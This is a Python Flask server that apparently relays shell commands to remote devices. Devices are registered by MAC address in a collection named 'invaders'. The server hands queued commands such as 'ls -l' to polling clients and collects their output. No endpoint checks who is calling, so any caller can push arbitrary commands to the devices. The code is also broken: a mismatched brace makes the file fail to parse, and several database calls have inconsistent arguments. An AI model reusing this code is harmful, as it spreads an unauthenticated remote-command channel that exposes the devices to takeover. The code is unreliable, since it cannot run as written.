#!/home/yogi/flaskk/yogi/bin/python

from flask import Flask, request, jsonify
from datetime import datetime, timedelta
import random
from database import Database
from pretty import Pretty
from commands import Commands

app = Flask(__name__)
Database.initialize()
ro = [
    {'mac': 'abcd',
     'commands': [{'token': 1234, 'serve': 'true', 'command': 'pwd', 'tag': 'false', 'response': ''}]
     },
    {'mac': 'efgh',
     'commands': [{'token': 1234, 'serve': 'true', 'command': 'ls -l', 'tag': 'false', 'response': ''}]
     }
]
print(ro)


@app.route('/store', methods=['POST'])
def hello():
    request_data = request.get_json()
    data = Database.find_one('invaders', {'mac': request_data['mac']})

    if data is not None:
        if 'token' in request_data:
            base = Database.find_one('invaders', {'mac': request_data['mac'], 'commands.token': request_data['token']})
            if base is not None:
                Database.update('invaders', (
                    {'mac': request_data['mac']
                        , 'commands.token': request_data['token']},
                    {"$set": {"commands.$.response": request_data['response']}}))
                Database.update('invaders', (
                    {'mac': request_data['mac']
                        , 'commands.token': request_data['token']}, {"$set": {"commands.$.tag": 'true'}}))

        request_data = {'mac': request_data['mac']}
        rev = Database.find('invaders', {'mac': request_data['mac'], 'commands.serve': 'true'})
        if rev is not None:
            randie = rev['commands']
            for i in randie:
                if i['serve'] == 'true':
                    rrr = i['token']
                    jjj = i['command']
                    print(rrr)
                    print(jjj)
                    request_data = {'mac': rev['mac'], 'token': rrr, 'command': jjj}
                    Database.update('invaders', (
                        {'mac': rev['mac']
                            , 'commands.token': i['token']}, {"$set": {"commands.$.serve": 'mild'}}))
                    break
        print(request_data)
        return jsonify(request_data)

    # if 'token' in request_data:
    #     for i in ro:
    #         if i['mac'] == request_data['mac']:
    #             for j in i['commands']:
    #                 if j['token'] == request_data['token']:
    #                     j['response'] = request_data['response']
    #                     j['tag'] = 'true'
    #     request_data = {'mac': request_data['mac']}
    #
    # for i in ro:
    #     print("start")
    #     print(request_data['mac'])
    #     if i['mac'] == request_data['mac']:
    #         print('finish')
    #         for j in i['commands']:
    #             if j['serve'] == 'true':
    #                 rrr = j['token']
    #                 jjj = j['command']
    #                 print(rrr)
    #                 print(jjj)
    #                 request_data = {'mac': i['mac'], 'token': rrr, 'command': jjj}
    #                 j['serve'] = 'mild'
    #                 break
    #         break
    #
    # print(request_data)
    # print(ro)
    # return jsonify(request_data)


@app.route('/store/<string:mac>', methods=['POST'])  # { 'command': "ls -l" }
def exec(mac):
    request_data = request.get_json()

    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        rand = random.randint(1000, 9999)
        print(rand)
        josn = Commands(mac=mac, token=rand, serve='true', command=request_data['command'], tag='false', response=''}
        josn.save_to_mongo()
        print('saved to mongo')

        a = datetime.now()
        b = timedelta(seconds=30)
        c = a + b
        while datetime.now() < c:
            r = Database.find('invaders', {'mac': mac, 'commands.token': rand, 'commands.tag': 'true'})
            while r is not None:
                print(r['mac'])
                randie = r['commands']
                for i in randie:
                    if i['token'] == rand:
                        response = i['response']
                        Database.update({'mac': mac}, {'$pull': {'commands': {'token': rand}}})
                        return jsonify(response)
        #
        Database.update({'mac': mac}, {'$pull': {'commands': {'token': rand}}})
        print('server timeout for' + rand)
        return jsonify({'output': 'server time out or server busy'})
    return jsonify({'output': 'unable to find with that mac'})

    # for i in ro:
    #     if i['mac'] == mac:
    #         rand = random.randint(1000, 9999)
    #         print(rand)
    #         josn = {'token': rand, 'serve': 'true', 'command': request_data['command'], 'tag': 'false', 'response': ''}
    #         i['commands'].append(josn)
    #         print(ro)
    #
    # for i in ro:
    #     if i['mac'] == mac:
    #         for j in i['commands']:
    #             if j['token'] == rand:
    #                 a = datetime.now()
    #                 b = timedelta(seconds=30)
    #                 c = a + b
    #                 while datetime.now() < c:
    #                     while not j['tag'] == 'false':
    #                         response = j['response']
    #                         print('yogi')
    #                         print(ro)
    #                         i['commands'].remove(j)
    #                         return jsonify(response)  # ({'output': response})
    #                 i['commands'].remove(j)
    #                 print(ro)
    #                 return jsonify({'output': 'server time out or server busy'})


# return {"ip": "192.168.1.1", "up": "25","down": "30"}


@app.route('/wheel/<string:mac>', methods=['POST'])  # adding new mac if doesn't exists
def registerpost(mac):
    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        return {"message": "Already exists"}
    doc = Pretty(mac=mac)
    doc.save_to_mongo()
    return {"message": "success"}


@app.route('/wheel/<string:mac>', methods=['GET'])  # checks for a mac if exists or not
def registerget(mac):
    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        print(data['mac'])
        randie = data['commands']
        for i in randie:
            print(i)
        return {"message": "Exists"}
    return {"message": "Doesn't Exists"}


if __name__ == '__main__':
    app.run(host='0.0.0.0')
